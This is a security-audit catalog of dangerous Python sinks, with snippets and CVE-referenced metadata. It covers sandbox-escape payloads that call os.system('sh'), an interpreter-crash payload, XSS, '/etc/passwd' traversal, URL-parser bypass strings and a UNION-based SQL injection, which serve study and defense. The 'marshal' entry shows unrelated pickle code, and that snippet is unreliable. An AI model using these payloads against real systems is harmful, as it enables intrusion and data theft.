# Python Sinks

> **Scope**: This catalog covers well-known Python sinks **and** niche, non-obvious sinks that are frequently ignored in security audits. The latter are annotated with `[NICHE]` and include real CTF references, CVEs, and exploitation caveats.
>
> **Version focus**: Python 3.x unless otherwise noted.

---

## RCE — Well-Known

`os.system()`, `os.popen()`, `subprocess.call/check_call/check_output/run/Popen()`, `exec()`, `eval()`, `compile()`, `__import__('os').system()`, `importlib.import_module()`, `code.InteractiveInterpreter`, `pty.spawn()`

## RCE — Niche / Hidden

### `codeop.compile_command()` — The Hidden `exec` Alternative
**Risk**: Developers block `eval`/`exec` but miss `codeop` since it's lower-level and undocumented. Any sandbox that allows `codeop` is effectively bypassed.

```python
import codeop
cmd = """
[x for x in [].__class__.__base__.__subclasses__()
 if x.__name__ == 'BuiltinImporter'][0].load_module('builtins').exec(
    'import os; os.system("whoami")',
    {'__builtins__': [x for x in [].__class__.__base__.__subclasses__()
                      if x.__name__ == 'BuiltinImporter'][0].load_module('builtins')}
)
"""
compiler = codeop.CommandCompiler()
code = compiler(cmd)
exec(code)
```
**Ref**: Sam Anttila — Breaking Python 3 eval protections.

```json
{
  "sink_id": "RCE-001",
  "category": "RCE",
  "title": "codeop.compile_command() as an indirect exec primitive",
  "severity": "critical",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://netsec.expert/posts/breaking-python3-eval-protections/",
      "title": "Breaking Python 3 eval protections",
      "author": "Sam Anttila",
      "date": "2021-01-16",
      "verified": true,
      "tags": ["python", "sandbox", "eval-bypass", "codeop", "exec"]
    }
  ],
  "confidence": "confirmed"
}
```

### `builtins.help()` / `builtins.license()` — Globals Access
**Risk**: `help()` and `license()` are builtins that expose `__globals__` even when `__builtins__` is cleared.

```python
# When __builtins__ is emptied:
help.__globals__["__builtins__"]["__import__"]("os").system("sh")
```
**Ref**: jiegec's pyjail collection.

```json
{
  "sink_id": "RCE-002",
  "category": "RCE",
  "title": "help() and license() globals recovery in restricted runtimes",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://jia.je/ctf-writeups/misc/pyjail/seccon-2024-quals-1linepyjail.html",
      "title": "Seccon 2024 quals 1linepyjail - CTF Writeups by @jiegec",
      "author": "Jiajie Chen",
      "date": "2026-04-27",
      "verified": true,
      "tags": ["pyjail", "help", "license", "__globals__", "builtins"]
    }
  ],
  "confidence": "confirmed"
}
```

---

## Deserialization — Well-Known

`pickle.loads()`, `pickle.load()`, `shelve.open()`, `yaml.load()` (without `Loader=SafeLoader`), `yaml.unsafe_load()`, `jsonpickle.decode()`, `dill.loads()`, `cloudpickle.loads()`, `marshal.loads()`

## Deserialization — Niche / Hidden

### `marshal` — Crash / RCE Beyond Pickle
**Risk**: Used for `.pyc` files. Malicious marshal payload can cause crashes or code execution. The `allow_code` parameter only partially mitigates.

```python
# DoS via malformed data
hex_string = "8004952A000000000000008C086461746574696D65948C086461746574696D65949388430A07B2010100000000000092059452942E"
myb = bytes.fromhex(hex_string)
f = io.BytesIO(myb)
data = pickle.load(f)  # SIGSEGV
```
**Ref**: CPython Issue #85380, Issue #113626 (algorithmic complexity attack).

```json
{
  "sink_id": "DESER-001",
  "category": "DESER",
  "title": "marshal deserialization of hostile data can crash or destabilize the interpreter",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/85380",
      "title": "An exploitable segmentation fault in marshal module",
      "author": "python/cpython",
      "date": "2020-07-04",
      "gh_issue": "python/cpython#85380",
      "verified": true,
      "tags": ["marshal", "deserialization", "segfault", "dos"]
    },
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/113626",
      "title": "Safer data serialization with marshal module",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#113626",
      "verified": true,
      "tags": ["marshal", "allow_code", "algorithmic-complexity", "pyc"]
    }
  ],
  "confidence": "confirmed"
}
```

### `copy.deepcopy` + `xml.etree.ElementTree` — UAF / Stack Overflow
**Risk**: Deeply nested XML + deepcopy causes SIGSEGV. Re-entrant `__deepcopy__` can trigger UAF.

```python
import xml.etree.ElementTree as ET
import copy

# SIGSEGV — unbounded C recursion
root = ET.Element("r")
cur = root
for i in range(500_000):
    c = ET.Element("n")
    cur.append(c)
    cur = c
copy.deepcopy(root)
```
**Ref**: CPython Issue #148801 (2026), Issue #133009 (UAF).

```json
{
  "sink_id": "DESER-002",
  "category": "DESER",
  "title": "deepcopy on ElementTree objects can trigger UAF or unbounded C recursion",
  "severity": "high",
  "affected_versions": ["3.13+", "3.14+", "3.15-dev"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/148801",
      "title": "Unbounded C recursion in `_elementtree.Element.__deepcopy__` causes causes stack overflow",
      "author": "python/cpython",
      "date": "2026-04-20",
      "gh_issue": "python/cpython#148801",
      "verified": true,
      "tags": ["elementtree", "deepcopy", "stack-overflow", "segfault"]
    },
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/133009",
      "title": "UAF: `xml.etree.ElementTree.Element.__deepcopy__` when concurrent mutations happen",
      "author": "python/cpython",
      "date": "2025-04-26",
      "gh_issue": "python/cpython#133009",
      "verified": true,
      "tags": ["elementtree", "deepcopy", "uaf", "memory-corruption"]
    }
  ],
  "confidence": "confirmed"
}
```

---

## SSTI — Well-Known

`jinja2.Template(user_input).render()`, `mako.template.Template(user_input).render()`, `tornado.template.Template(user_input).generate()`, `django.template.Template(user_input)`

## SSTI — Niche / Hidden

### Jinja2 `|safe` Filter on Tainted Data
**Risk**: Marking user input as "safe" bypasses auto-escaping. Also applies to Django `mark_safe()`, `markupsafe.Markup()`.

```python
from markupsafe import Markup
user_input = "<script>alert(1)</script>"
Markup(user_input)  # XSS if rendered in template
```

```json
{
  "sink_id": "SSTI-001",
  "category": "SSTI",
  "title": "Jinja2 safe-marking helpers disable escaping on tainted input",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://jinja.palletsprojects.com/en/stable/templates/#jinja-filters.safe",
      "title": "Jinja Template Designer Documentation — safe",
      "author": "Pallets",
      "date": "2025-06-12",
      "verified": true,
      "tags": ["jinja2", "safe-filter", "xss", "autoescape"]
    },
    {
      "type": "blog_post",
      "url": "https://markupsafe.palletsprojects.com/en/stable/escaping/#markupsafe.Markup",
      "title": "MarkupSafe — Working With Safe Text",
      "author": "Pallets",
      "date": "2025-09-27",
      "verified": true,
      "tags": ["markupsafe", "markup", "xss", "html-escaping"]
    }
  ],
  "confidence": "confirmed"
}
```

---

## File Operations — Well-Known

`open()`, `os.path.*`, `shutil.*`, `tempfile.*`, `zipfile.extractall()` (zip slip), `tarfile.extractall()` (tar slip), `os.symlink()`, `pathlib.Path`

## File Operations — Niche / Hidden

### `shutil.move` Non-Atomic Fallback
**Risk**: Falls back to `copy+remove` if `os.rename` fails — silently, without warning. Creates a race window.

```python
if not os.path.exists(dst):  # CHECK
    shutil.move(src, dst)    # USE — may overwrite attacker-created file
```
**Ref**: CPython Issue #109503.

```json
{
  "sink_id": "FILE-001",
  "category": "FILE",
  "title": "shutil.move silently degrades from rename to copy+remove",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/109503",
      "title": "Inaccurate and misleading document for shutil.move in case src/target are on the same filesystem",
      "author": "python/cpython",
      "date": "2023-09-17",
      "gh_issue": "python/cpython#109503",
      "verified": true,
      "tags": ["shutil", "move", "race-condition", "non-atomic"]
    }
  ],
  "confidence": "confirmed"
}
```

### `tempfile.mktemp` Race (CWE-377)
**Risk**: Generates a filename without creating the file atomically. Attacker can create a symlink at that path.

```python
filename = tempfile.mktemp(suffix='', prefix='tmp', dir='/tmp')
# RACE WINDOW
with open(filename, 'w') as f:  # May follow symlink!
    f.write("sensitive data")
```
**Ref**: Python Issue 43604.

```json
{
  "sink_id": "FILE-002",
  "category": "FILE",
  "title": "tempfile.mktemp returns a path without atomic creation",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "cpython_issue",
      "url": "https://bugs.python.org/issue43604",
      "title": "Issue 43604: Fix tempfile.mktemp()",
      "author": "Python Software Foundation",
      "date": "2021-03-23",
      "verified": true,
      "tags": ["tempfile", "mktemp", "cwe-377", "symlink-race"]
    }
  ],
  "confidence": "confirmed"
}
```

### `TarFile.extractall(..., filter='tar')` — Symlink-Based Arbitrary chmod
**Risk**: Despite the `filter` security feature, `filter='tar'` can chmod files outside the extraction directory via symlink + deferred chmod interaction.

```python
# Tar structure:
#   x -> ../../../../target (symlink)
#   x/..data
# After extraction: deferred chmod runs on 'x', resolving to arbitrary file
```
**Ref**: CPython Issue #127987.

```json
{
  "sink_id": "FILE-003",
  "category": "FILE",
  "title": "TarFile.extractall filter='tar' can chmod arbitrary files via symlink rewriting",
  "severity": "high",
  "affected_versions": ["3.10+", "3.11+", "3.12+", "3.13+", "3.14+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/127987",
      "title": "TarFile.extractall(..., filter='tar') arbitrary file chmod",
      "author": "python/cpython",
      "date": "2024-12-16",
      "gh_issue": "python/cpython#127987",
      "verified": true,
      "tags": ["tarfile", "symlink", "chmod", "path-traversal"]
    }
  ],
  "confidence": "confirmed"
}
```

### `pkgutil.get_data()` — Path Traversal (CVE-2026-3479)
**Risk**: Documented restrictions are not enforced, allowing path traversal outside package.

```python
import pkgutil
data = pkgutil.get_data('package', '../../../etc/passwd')
```
**Ref**: CPython Issue #146121. Fixed in Python 3.15.

```json
{
  "sink_id": "FILE-004",
  "category": "FILE",
  "title": "pkgutil.get_data() resource argument traversal escapes package boundaries",
  "severity": "high",
  "affected_versions": ["3.10+", "3.11+", "3.12+", "3.13+", "3.14+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/146121",
      "title": "[CVE-2026-3479] Documented `pkgutil.get_data()` restrictions are not enforced",
      "author": "python/cpython",
      "date": "2026-03-18",
      "cve_id": "CVE-2026-3479",
      "gh_issue": "python/cpython#146121",
      "verified": true,
      "tags": ["pkgutil", "path-traversal", "resource-loading", "cve"]
    }
  ],
  "confidence": "confirmed"
}
```

---

## SSRF — Well-Known

`requests.get/post()`, `urllib.request.urlopen()`, `http.client.HTTPConnection`, `httpx`, `aiohttp.ClientSession`, `urllib3`

## SSRF — Niche / Hidden

### `urllib.parse` — Multiple CVEs
**Risk**: URL parsing edge cases bypass SSRF filters, cause CRLF injection, or cache poisoning.

```python
from urllib.parse import urlparse

# CVE-2023-24329: Space bypass
urlparse("  http://evil.com/")  # Still parses as 'evil.com'

# CVE-2024-11168: Bracketed host bypass
urlparse("http://[localhost]/")

# CVE-2022-0391: CRLF injection
urlsplit("http://example.com/%0D%0AHELO%20evil.com%0D%0A")

# CVE-2021-23336: Semicolon separator cache poisoning
parse_qsl("a=1;b=2&c=3")
```
**Refs**: VU#127587, Python Issue #88048, AppSecure, Python Issue #87133.

```json
{
  "sink_id": "SSRF-001",
  "category": "SSRF",
  "title": "urllib.parse edge cases undermine SSRF and URL validation logic",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "security_advisory",
      "url": "https://www.kb.cert.org/vuls/id/127587",
      "title": "VU#127587 - Python Parsing Error Enabling Bypass CVE-2023-24329",
      "author": "CERT Coordination Center",
      "date": "2023-08-11",
      "cve_id": "CVE-2023-24329",
      "verified": true,
      "tags": ["urllib.parse", "ssrf", "crlf", "cache-poisoning", "url-parse"]
    }
  ],
  "confidence": "likely"
}
```

---

## SQLi — Well-Known

`cursor.execute(f"...")`, `sqlalchemy.text()`, Django `raw()`, `extra()`, `RawSQL()`

## SQLi — Niche / Hidden

### `sqlite3` Table Name Injection
**Risk**: SQLite3 supports parameterization for VALUES but NOT for table/column names.

```python
import sqlite3
# WRONG — SQL injection possible
conn.execute(f"SELECT * FROM {user_input}")

# Bracket escaping bypass
malicious_name = "users] UNION SELECT password FROM users--"
query = f"SELECT * FROM [{malicious_name}]"
# Parses as: SELECT * FROM [users] UNION SELECT password FROM users--
```
**Ref**: Python Issue #11685, Datasette Advisory.

```json
{
  "sink_id": "SQLI-001",
  "category": "SQLI",
  "title": "sqlite3 identifier interpolation enables table-name SQL injection",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/library/sqlite3.html",
      "title": "sqlite3 — DB-API 2.0 interface for SQLite databases",
      "author": "Python Software Foundation",
      "date": "2026-04-28",
      "verified": true,
      "tags": ["sqlite3", "sqli", "identifier-injection", "db-api"]
    }
  ],
  "confidence": "confirmed"
}
```

---

## Class Confusion / Type System Sinks
